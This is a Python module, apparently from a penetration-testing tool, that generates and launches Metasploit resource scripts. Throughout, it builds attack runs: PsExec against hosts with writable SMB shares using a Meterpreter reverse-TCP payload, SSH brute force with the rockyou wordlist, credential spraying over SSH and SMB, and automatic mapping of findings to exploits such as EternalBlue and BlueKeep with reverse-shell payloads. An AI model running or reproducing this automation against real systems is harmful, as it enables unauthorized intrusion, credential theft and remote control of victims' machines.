#!/usr/bin/env python3
"""
menuscript.core.msf_integration - Metasploit Framework integration utilities
"""
import os
import subprocess
from typing import List, Dict, Any, Optional
from pathlib import Path
import click


class MSFResourceGenerator:
    """Generate Metasploit resource scripts from menuscript data."""
    
    def __init__(self, output_dir: str = None):
        """Initialize generator with output directory."""
        self.output_dir = output_dir or os.path.join(os.getcwd(), 'msf_resources')
        os.makedirs(self.output_dir, exist_ok=True)
    
    def generate_header(self) -> str:
        """Generate resource script header with metadata."""
        from datetime import datetime
        return f"""# Metasploit Resource Script
# Generated by menuscript on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# 
# Usage: msfconsole -r this_script.rc
#

"""
    
    def generate_smb_psexec_script(self, writable_shares: List[Dict], credentials: List[Dict]) -> str:
        """
        Generate psexec attack script for writable SMB shares.
        
        Args:
            writable_shares: List of writable SMB shares from SMBSharesManager
            credentials: List of valid credentials from CredentialsManager
        
        Returns:
            Resource script content
        """
        script = self.generate_header()
        script += "# SMB PsExec Attack - Writable Shares\n"
        script += "# Attempts to execute commands on hosts with writable shares\n\n"
        
        # Group shares by host
        shares_by_host = {}
        for share in writable_shares:
            host_ip = share.get('ip_address')
            if host_ip not in shares_by_host:
                shares_by_host[host_ip] = []
            shares_by_host[host_ip].append(share)
        
        # Find SMB credentials
        smb_creds = [c for c in credentials if c.get('service', '').lower() in ['smb', 'smb2', '445', 'cifs']]
        
        if not smb_creds:
            script += "# WARNING: No SMB credentials found!\n"
            script += "# You'll need to set SMBUser and SMBPass manually\n\n"
        
        for host_ip, shares in shares_by_host.items():
            script += f"\n# Target: {host_ip}\n"
            script += f"# Writable shares: {', '.join([s['share_name'] for s in shares])}\n"
            script += "use exploit/windows/smb/psexec\n"
            script += f"set RHOSTS {host_ip}\n"
            
            if smb_creds:
                # Use first valid credential
                cred = smb_creds[0]
                script += f"set SMBUser {cred.get('username', 'Administrator')}\n"
                script += f"set SMBPass {cred.get('password', '')}\n"
            
            script += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
            script += "set LHOST 0.0.0.0  # CHANGE THIS\n"
            script += "set LPORT 4444\n"
            script += "exploit -z\n"
            script += "\n"
        
        return script
    
    def generate_ssh_bruteforce_script(self, ssh_hosts: List[Dict], username_file: str = None, password_file: str = None) -> str:
        """
        Generate SSH brute force script.
        
        Args:
            ssh_hosts: List of hosts with SSH service
            username_file: Path to username wordlist
            password_file: Path to password wordlist
        
        Returns:
            Resource script content
        """
        script = self.generate_header()
        script += "# SSH Brute Force Attack\n\n"
        
        # Default wordlists
        if not username_file:
            username_file = "/usr/share/metasploit-framework/data/wordlists/unix_users.txt"
        if not password_file:
            password_file = "/usr/share/wordlists/rockyou.txt"
        
        script += "use auxiliary/scanner/ssh/ssh_login\n"
        
        # Build RHOSTS list
        rhosts = ' '.join([h.get('ip_address', '') for h in ssh_hosts])
        script += f"set RHOSTS {rhosts}\n"
        script += f"set USER_FILE {username_file}\n"
        script += f"set PASS_FILE {password_file}\n"
        script += "set THREADS 10\n"
        script += "set VERBOSE true\n"
        script += "set STOP_ON_SUCCESS true\n"
        script += "run\n"
        
        return script
    
    def generate_credential_spray_script(self, credentials: List[Dict], targets: List[Dict]) -> str:
        """
        Generate credential spraying script across multiple services.
        
        Args:
            credentials: List of discovered credentials
            targets: List of hosts with services
        
        Returns:
            Resource script content
        """
        script = self.generate_header()
        script += "# Credential Spraying - Test credentials across all targets\n\n"
        
        # Group targets by service
        services_map = {}
        for target in targets:
            service = target.get('service_name', 'unknown').lower()
            port = target.get('port', 0)
            ip = target.get('ip_address', '')
            
            if service not in services_map:
                services_map[service] = []
            services_map[service].append((ip, port))
        
        # SSH credential spray
        if 'ssh' in services_map:
            script += "\n# SSH Credential Spray\n"
            script += "use auxiliary/scanner/ssh/ssh_login\n"
            rhosts = ' '.join([ip for ip, _ in services_map['ssh']])
            script += f"set RHOSTS {rhosts}\n"
            
            for cred in credentials:
                username = cred.get('username', '')
                password = cred.get('password', '')
                if username and password:
                    script += f"set USERNAME {username}\n"
                    script += f"set PASSWORD {password}\n"
                    script += "run\n"
            script += "\n"
        
        # SMB credential spray
        if any(s in services_map for s in ['smb', 'microsoft-ds', 'netbios-ssn']):
            script += "\n# SMB Credential Spray\n"
            script += "use auxiliary/scanner/smb/smb_login\n"
            
            # Get all SMB-related hosts
            smb_hosts = []
            for key in ['smb', 'microsoft-ds', 'netbios-ssn']:
                if key in services_map:
                    smb_hosts.extend([ip for ip, _ in services_map[key]])
            
            rhosts = ' '.join(set(smb_hosts))
            script += f"set RHOSTS {rhosts}\n"
            
            for cred in credentials:
                username = cred.get('username', '')
                password = cred.get('password', '')
                if username and password:
                    script += f"set SMBUser {username}\n"
                    script += f"set SMBPass {password}\n"
                    script += "run\n"
            script += "\n"
        
        return script
    
    def generate_exploit_script(self, vulnerabilities: List[Dict]) -> str:
        """
        Generate exploit script based on discovered vulnerabilities.
        
        Args:
            vulnerabilities: List of findings with exploit recommendations
        
        Returns:
            Resource script content
        """
        script = self.generate_header()
        script += "# Automated Exploitation - Based on discovered vulnerabilities\n\n"
        
        for vuln in vulnerabilities:
            title = vuln.get('title', 'Unknown')
            host_ip = vuln.get('ip_address', 'N/A')
            port = vuln.get('port', 0)
            
            script += f"\n# {title} on {host_ip}:{port}\n"
            
            # Try to determine module from vulnerability
            module = self._get_exploit_module(vuln)
            
            if module:
                script += f"use {module}\n"
                script += f"set RHOST {host_ip}\n"
                if port:
                    script += f"set RPORT {port}\n"
                script += "set PAYLOAD generic/shell_reverse_tcp\n"
                script += "set LHOST 0.0.0.0  # CHANGE THIS\n"
                script += "set LPORT 4444\n"
                script += "check\n"
                script += "# exploit -z  # Uncomment to actually exploit\n"
            else:
                script += f"# No known exploit module for this vulnerability\n"
            
            script += "\n"
        
        return script
    
    def _get_exploit_module(self, vuln: Dict) -> Optional[str]:
        """Map vulnerability to MSF exploit module."""
        title = vuln.get('title', '').lower()
        description = vuln.get('description', '').lower()
        
        # Simple keyword matching (can be expanded)
        module_map = {
            'eternalblue': 'exploit/windows/smb/ms17_010_eternalblue',
            'ms17-010': 'exploit/windows/smb/ms17_010_eternalblue',
            'bluekeep': 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
            'cve-2019-0708': 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
            'shellshock': 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
            'vsftpd 2.3.4': 'exploit/unix/ftp/vsftpd_234_backdoor',
            'distcc': 'exploit/unix/misc/distcc_exec',
            'samba 3.0.20': 'exploit/multi/samba/usermap_script',
        }
        
        for keyword, module in module_map.items():
            if keyword in title or keyword in description:
                return module
        
        return None
    
    def save_script(self, content: str, filename: str) -> str:
        """
        Save resource script to file.
        
        Args:
            content: Script content
            filename: Output filename (without path)
        
        Returns:
            Full path to saved file
        """
        filepath = os.path.join(self.output_dir, filename)
        
        with open(filepath, 'w') as f:
            f.write(content)
        
        # Make executable
        os.chmod(filepath, 0o755)
        
        return filepath


class MSFModuleSelector:
    """Recommend MSF modules based on service/vulnerability data."""
    
    # Module database with metadata
    MODULES = {
        'ssh': {
            'scanner': [
                {
                    'path': 'auxiliary/scanner/ssh/ssh_version',
                    'name': 'SSH Version Scanner',
                    'description': 'Detect SSH server version',
                    'risk': 'safe'
                },
                {
                    'path': 'auxiliary/scanner/ssh/ssh_enumusers',
                    'name': 'SSH User Enumeration',
                    'description': 'Enumerate valid SSH usernames',
                    'risk': 'safe'
                },
                {
                    'path': 'auxiliary/scanner/ssh/ssh_login',
                    'name': 'SSH Login Scanner',
                    'description': 'Brute force SSH authentication',
                    'risk': 'noisy'
                },
            ],
            'exploit': []
        },
        'smb': {
            'scanner': [
                {
                    'path': 'auxiliary/scanner/smb/smb_version',
                    'name': 'SMB Version Detection',
                    'description': 'Detect SMB version and OS',
                    'risk': 'safe'
                },
                {
                    'path': 'auxiliary/scanner/smb/smb_enumshares',
                    'name': 'SMB Share Enumeration',
                    'description': 'List available SMB shares',
                    'risk': 'safe'
                },
                {
                    'path': 'auxiliary/scanner/smb/smb_enumusers',
                    'name': 'SMB User Enumeration',
                    'description': 'Enumerate SMB users via RID cycling',
                    'risk': 'safe'
                },
                {
                    'path': 'auxiliary/scanner/smb/smb_login',
                    'name': 'SMB Login Scanner',
                    'description': 'Brute force SMB authentication',
                    'risk': 'noisy'
                },
            ],
            'exploit': [
                {
                    'path': 'exploit/windows/smb/ms17_010_eternalblue',
                    'name': 'EternalBlue SMB RCE',
                    'description': 'Exploit MS17-010 (EternalBlue)',
                    'risk': 'dangerous',
                    'cve': ['CVE-2017-0143', 'CVE-2017-0144', 'CVE-2017-0145']
                },
                {
                    'path': 'exploit/windows/smb/psexec',
                    'name': 'PsExec',
                    'description': 'Execute commands via SMB (requires creds)',
                    'risk': 'moderate',
                    'requires': 'credentials'
                },
            ]
        },
        'http': {
            'scanner': [
                {
                    'path': 'auxiliary/scanner/http/dir_scanner',
                    'name': 'Directory Scanner',
                    'description': 'Brute force web directories',
                    'risk': 'noisy'
                },
                {
                    'path': 'auxiliary/scanner/http/http_version',
                    'name': 'HTTP Version Detection',
                    'description': 'Detect web server version',
                    'risk': 'safe'
                },
            ],
            'exploit': []
        },
        'rdp': {
            'scanner': [
                {
                    'path': 'auxiliary/scanner/rdp/rdp_scanner',
                    'name': 'RDP Scanner',
                    'description': 'Detect RDP service',
                    'risk': 'safe'
                },
            ],
            'exploit': [
                {
                    'path': 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
                    'name': 'BlueKeep RDP RCE',
                    'description': 'Exploit CVE-2019-0708 (BlueKeep)',
                    'risk': 'dangerous',
                    'cve': ['CVE-2019-0708']
                },
            ]
        },
    }
    
    def get_recommendations(self, service: str, version: str = None, include_risk: List[str] = None) -> List[Dict]:
        """
        Get module recommendations for a service.
        
        Args:
            service: Service name (ssh, smb, http, etc.)
            version: Service version string
            include_risk: List of risk levels to include ['safe', 'noisy', 'moderate', 'dangerous']
        
        Returns:
            List of recommended modules
        """
        if include_risk is None:
            include_risk = ['safe', 'noisy', 'moderate']
        
        service_lower = service.lower()
        recommendations = []
        
        # Get modules for this service
        if service_lower in self.MODULES:
            modules = self.MODULES[service_lower]
            
            for category in ['scanner', 'exploit']:
                for module in modules.get(category, []):
                    if module['risk'] in include_risk:
                        module['category'] = category
                        recommendations.append(module)
        
        return recommendations
    
    def match_vulnerability_to_exploit(self, vuln_title: str, vuln_desc: str = '', cves: List[str] = None) -> List[Dict]:
        """
        Match a vulnerability to potential exploit modules.
        
        Args:
            vuln_title: Vulnerability title
            vuln_desc: Vulnerability description
            cves: List of CVE IDs
        
        Returns:
            List of matching exploit modules
        """
        matches = []
        
        for service, modules in self.MODULES.items():
            for exploit in modules.get('exploit', []):
                # Check CVE match
                if cves and 'cve' in exploit:
                    if any(cve in exploit['cve'] for cve in cves):
                        matches.append(exploit)
                        continue
                
                # Check keyword match
                keywords = vuln_title.lower() + ' ' + vuln_desc.lower()
                module_keywords = exploit['name'].lower() + ' ' + exploit['description'].lower()
                
                if any(word in keywords for word in module_keywords.split()):
                    matches.append(exploit)
        
        return matches


class MSFConsoleManager:
    """Manage msfconsole sessions and RPC communication."""
    
    def __init__(self):
        """Initialize MSF console manager."""
        self.msf_path = self._find_msfconsole()
    
    def _find_msfconsole(self) -> str:
        """Find msfconsole executable."""
        # Try common locations
        locations = [
            '/usr/bin/msfconsole',
            '/opt/metasploit-framework/bin/msfconsole',
            'msfconsole'  # In PATH
        ]
        
        for loc in locations:
            try:
                result = subprocess.run([loc, '--version'], capture_output=True, timeout=5)
                if result.returncode == 0:
                    return loc
            except (FileNotFoundError, subprocess.TimeoutExpired):
                continue
        
        return None
    
    def is_available(self) -> bool:
        """Check if msfconsole is available."""
        return self.msf_path is not None
    
    def launch_with_resource(self, resource_file: str, background: bool = False, use_sudo: bool = True) -> subprocess.Popen:
        """
        Launch msfconsole with a resource script.
        
        Args:
            resource_file: Path to .rc file
            background: Run in background
            use_sudo: Use sudo for privilege escalation (default: True)
        
        Returns:
            Process handle if background, None otherwise
        """
        if not self.is_available():
            raise RuntimeError("msfconsole not found")
        
        cmd = []
        if use_sudo:
            cmd.append('sudo')
        cmd.extend([self.msf_path, '-q', '-r', resource_file])
        
        if background:
            return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            # Interactive mode - use subprocess.run to maintain terminal control
            subprocess.run(cmd)
            return None
    
    def launch_interactive(self, pre_commands: List[str] = None, workspace: str = None, use_sudo: bool = True) -> None:
        """
        Launch interactive msfconsole with optional pre-commands.
        
        Args:
            pre_commands: List of commands to run on startup
            workspace: Workspace name to create/use
            use_sudo: Use sudo for privilege escalation (default: True)
        """
        if not self.is_available():
            raise RuntimeError("msfconsole not found")
        
        # Build command
        cmd = []
        if use_sudo:
            cmd.append('sudo')
        cmd.extend([self.msf_path, '-q'])
        
        # Create temporary resource script if we have pre-commands
        if pre_commands or workspace:
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                if workspace:
                    f.write(f"workspace -a {workspace}\n")
                    f.write(f"workspace {workspace}\n")
                
                if pre_commands:
                    for cmd_line in pre_commands:
                        f.write(f"{cmd_line}\n")
                
                rc_file = f.name
            
            try:
                cmd.extend(['-r', rc_file])
                subprocess.run(cmd)
            finally:
                os.unlink(rc_file)
        else:
            # Just launch msfconsole
            subprocess.run(cmd)
    
    def execute_command(self, command: str) -> str:
        """
        Execute a single msfconsole command and return output.
        
        Args:
            command: MSF command to execute
        
        Returns:
            Command output
        """
        if not self.is_available():
            raise RuntimeError("msfconsole not found")
        
        # Create temporary rc file
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
            f.write(command + '\n')
            f.write('exit\n')
            rc_file = f.name
        
        try:
            result = subprocess.run(
                [self.msf_path, '-q', '-r', rc_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            return result.stdout
        finally:
            os.unlink(rc_file)
